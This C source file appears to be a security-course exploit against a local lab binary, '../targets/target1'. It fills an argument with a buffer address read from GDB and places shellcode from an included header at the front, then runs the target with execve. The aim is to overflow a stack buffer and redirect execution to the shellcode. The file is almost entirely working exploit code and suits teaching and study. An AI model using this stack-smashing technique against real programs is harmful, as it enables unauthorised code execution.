#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"

int
main(int argc, char* argv[])
{
	char* args[3];
	char* env[1];
        
        // Store important addresses gotten from GDB
        int ripAddr = 0x2021fe88;
        int bufAddrStart = 0x2021fe10;
        int bufAddrEnd = bufAddrStart + 96;
        int overflowSize = ripAddr - bufAddrStart;
        
        // Set up arg list for execve call
	args[0] = TARGET;
	args[1] = malloc(sizeof(char) * overflowSize);
	args[2] = NULL;

	env[0] = NULL;
        
        // Create attack string
        long *ptr = (long *) args[1];
        int i; // Have to do this in C99 ffs
        for (i = 0; i < overflowSize / 8; ++i) {
            // Fill string with address of buffer
            *(ptr + i) = (int) bufAddrStart; 
        }
        for (i = 0; i < strlen(shellcode); ++i) {
            args[1][i] = shellcode[i];
        }
        
        // Do execve call
	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
